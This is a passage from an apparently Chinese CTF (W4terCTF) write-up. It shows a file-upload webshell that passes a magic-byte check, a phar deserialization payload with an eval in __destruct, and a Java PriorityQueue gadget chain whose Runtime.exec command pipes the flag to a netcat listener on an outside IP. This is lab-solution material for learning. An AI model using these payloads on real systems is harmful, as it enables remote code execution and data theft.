class="token operator">.</span> <span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$typeCode</span> <span class="token operator">==</span> <span class="token number">255216</span> <span class="token operator">||</span> <span class="token variable">$typeCode</span> <span class="token operator">==</span> <span class="token number">7173</span> <span class="token operator">||</span> <span class="token variable">$typeCode</span> <span class="token operator">==</span> <span class="token number">13780</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$typeCode</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>只需要在 php 木马前加上 <code>GI</code> （ 2 个字节对应 <code>7173</code> ）就可以通过检查，写一个返回 flag 的 php 木马：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre>GI<span class="token operator">&lt;</span>?php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$currentDirectory</span> <span class="token operator">=</span> realpath<span class="token punctuation">(</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">))</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$flag_path</span> <span class="token operator">=</span> realpath<span class="token punctuation">(</span><span class="token variable">$currentDirectory</span> <span class="token builtin class-name">.</span> <span class="token string">'/../../../../../flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$flag</span> <span class="token operator">=</span> fopen<span class="token punctuation">(</span><span class="token variable">$flag_path</span> , <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$content</span> <span class="token operator">=</span> fread<span class="token punctuation">(</span><span class="token variable">$flag</span>, filesize<span class="token punctuation">(</span><span class="token variable">$flag_path</span><span class="token punctuation">))</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token builtin class-name">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    fclose<span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token builtin class-name">echo</span> <span class="token string">"无法打开文件 <span class="token variable">$filename</span>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>?<span class="token operator">></span></pre></td></tr></table></figure><p>然后上传该文件，文件已经被改名为了 md5 随机码，F12 找到该文件的 url ：</p><p><img data-src="https://s2.loli.net/2024/04/29/LRhQcpyB2oZPMkq.png" alt="LRhQcpyB2oZPMkq"></p><p>然后在该 url 后面加上 <code>/.php</code> 就可以执行该 php 木马：</p><p><img data-src="https://s2.loli.net/2024/04/29/t6FA2a8iX9OwGog.png" alt="t6FA2a8iX9OwGog"></p><p><code>W4terCTF&#123;uPL04Ds_ar3_0UR_vlC3_RCE_WwwWWw&#125;</code></p><h2 id="auto-unserialize"><a class="anchor" href="#auto-unserialize">#</a> Auto Unserialize</h2><p>首先在盲目找线索的阶段我是用 <code>GET</code> 方法得到 flag 的位置的：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">curl</span> <span class="token string">"http://127.0.0.1:54018/?img_file=../../../flag"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># Return Success</span></pre></td></tr></table></figure><p>直到我看到了参考资料：<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzY4MC8=">reference</span></p><p>首先可能先需要：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre>php <span class="token parameter variable">--ini</span></pre></td></tr></table></figure><p>找到 <code>php.ini</code> 加上这一行：</p><figure class="highlight ini"><figcaption data-lang="ini"><span>php.ini</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token key attr-name">phar.readonly</span> <span class="token punctuation">=</span> <span class="token value attr-value">Off;</span></pre></td></tr></table></figure><p>构造 payload <code>phar.phar</code> 文件用的 <code>phar_gen.php</code> ：</p><figure class="highlight php"><figcaption data-lang="PHP"><span>phar_gen.php</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">command_test</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">public</span> <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"echo file_get_contents('../../../flag');"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置 stub, 增加 gif 文件头，伪造文件类型</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">command_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将自定义 meta-data 存入 manifest</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 添加要压缩的文件</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">// 签名自动计算</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>运行脚本生成 payload <code>phar.phar</code> 文件，上传该文件，最后 <code>GET</code> 请求获取 flag ：：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre>php phar_gen.php</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token string">"file=@phar.phar"</span> http://127.0.0.1:54018/</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">curl</span> <span class="token string">"http://127.0.0.1:54018/?img_file=phar://check.jpg/test.txt"</span></pre></td></tr></table></figure><p><code>W4terCTF&#123;uNsErl4I1z3_tH3_pH4r_ArCh1v3_TO_ReveAl_tHE_hIDdEn_tREASUrE_OF_7h3_Php_5Erver&#125;</code></p><h2 id="just-readobject"><a class="anchor" href="#just-readobject">#</a> Just ReadObject</h2><p>先贴 payload：</p><p>突破口是队友查到的一个比较有名的案例：Java 的优先队列序列化的时候，会把元素一个一个 add 进去，而 add 需要元素之间的比较。如果优先队列初始化时指定了比较器，会直接调用比较器的 <code>compare</code> 方法。</p><p>参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFsL2Jsb2IvYjdkMGYyN2I0NmFmMDZiYmNlZDdkYmFmZGRjNDk2NzgxNzlkMzcwOC9zcmMvbWFpbi9qYXZhL3lzb3NlcmlhbC9wYXlsb2Fkcy9Db21tb25zQ29sbGVjdGlvbnM3LmphdmEjTDY=">ysoserial/src/main/java/ysoserial/payloads/CommonsCollections7.java at b7d0f27b46af06bbced7dbafddc49678179d3708 · frohoff/ysoserial · GitHub</span></p><p>而 jar 包里有个 <code>W4terTransformingComparator</code> ，它实现了 <code>Comparator</code> ，可以作为优先队列的比较器，并且它的 <code>compare</code> 方法非常的狂野：</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj1<span class="token punctuation">,</span> <span class="token class-name">Object</span> obj2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>       <span class="token comment">// ...</span></pre></td></tr><tr><td data-num="3"></td><td><pre>       value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>       <span class="token class-name">Object</span> value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>   <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>大概就是会调用两个比较对象的 <code>transform</code> 方法，然后呢这个类还有个 <code>decorated</code> 字段，类型是这个类自己，上面两个 <code>transform</code> 调用完，会接着调用 <code>decorated</code> 的 <code>compare</code> 方法，相当于一个 <code>W4terTransformingComparator</code> 类型的链表。</p><p>那对于 transformer 呢，jar 包里还有一个 <code>W4terInvokerTransformer</code> ，这个更狂野，它有这三个字段：方法名，参数类型定义列表，参数列表。这几个字段在序列化过程就可以完成加载。</p><p>而它的 <code>transform(Object obj)</code> 方法，会直接根据上面的三个参数， <code>invoke</code> 这个 <code>obj</code> 的指定方法。</p><p>所以可以用它构造一个优先队列，指定比较器为这么一个比较器链表，每一级比较器都可以对 obj 用任意参数执行任意方法，并且优先队列里的元素也可以自己塞。</p><p>首先想到的是 <code>Runtime.getRuntime().exec(cmd)</code> ，由于 <code>Runtime</code> 是不可序列化的运行时 context，需要用反射获取，我们的方法是 <code>Class.class.forName(&quot;java.lang.Runtime&quot;)</code> 。</p><p>也就是说优先队列里要先塞个 <code>Class.class</code> ，然后把上面的调用链拉成 <code>W4terTransformingComparator</code> 的链表即可。payload 如下：</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">Comparator</span> comp_empty <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">W4terComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token class-name">W4terTransformer</span> trans_for_name <span class="token operator">=</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">W4terInvokerTransformer</span><span class="token punctuation">.</span><span class="token function">invokerTransformer</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token string">"forName"</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token class-name">W4terTransformer</span> trans_get_method <span class="token operator">=</span> </pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token class-name">W4terInvokerTransformer</span><span class="token punctuation">.</span><span class="token function">invokerTransformer</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token string">"getMethod"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token class-name">W4terTransformer</span> trans_exec <span class="token operator">=</span> </pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token class-name">W4terInvokerTransformer</span><span class="token punctuation">.</span><span class="token function">invokerTransformer</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token string">"exec"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                <span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat /tmp/flag | nc 172.18.198.218 6666"</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token class-name">W4terTransformer</span> trans_invoke <span class="token operator">=</span> </pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token class-name">W4terInvokerTransformer</span><span class="token punctuation">.</span><span class="token function">invokerTransformer</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token string">"invoke"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token class-name">W4terTransformingComparator</span> comp_final <span class="token operator">=</span> </pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">W4terTransformingComparator</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                trans_for_name<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token keyword">new</span> <span class="token class-name">W4terTransformingComparator</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                    trans_get_method<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                    <span class="token keyword">new</span> <span class="token class-name">W4terTransformingComparator</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                        trans_invoke<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                        <span class="token keyword">new</span> <span class="token class-name">W4terTransformingComparator</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                            trans_exec<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="40"></td><td><pre>                            comp_empty</pre></td></tr><tr><td data-num="41"></td><td><pre>                        <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>                    <span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Class</span><span class="token punctuation">></span></span> pq <span class="token operator">=</span> </pre></td></tr><tr><td data-num="45"></td><td><pre>            <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Class</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>comp_final<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token function">serialize</span><span class="token punctuation">(</span>pq<span class="token punctuation">,</span> <span class="token string">"hack.obj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>本地开 nc 监听 6666 端口，然后上传 <code>hack.obj</code> 即可立刻收到 flag。</p><h1 id="crypto"><a class="anchor" href="#crypto">#</a> Crypto</h1><h2 id="smoke-hints"><a class="anchor" href="#smoke-hints">#</a> Smoke hints</h2><p>从 task.py 可以得到以下信息</p><p>以下将 hint1~hint5 简写为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">h_1 -h_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span></p><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">h_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span> 是随机生成的 18 位素数</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>h</mi><mn>1</mn></msub><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mi>e</mi><mi mathvariant="normal">%</mi><msub><mi>h</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">h_2=(h_1-2)!e\%h_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord">2</span><span class="mclose">)</span><span class="mclose">!</span><span class="mord mathnormal">e</span><span class="mord">%</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mn>3</mn></msub><mo>=</mo><mo stretchy="false">⌊</mo><mfrac><mi>p</mi><msup><mn>2</mn><mn>256</mn></msup></mfrac><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">h_3=\lfloor\frac{p}{2^{256}}\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-.345em"></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.7475em"><span style="top:-2.6550000000000002em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.7463142857142857em"><span style="top:-2.786em;margin-right:.07142857142857144em"><span class="pstrut" style="height:2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.446108em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.345em"><span></span></span></span></span></span><span class="mclose 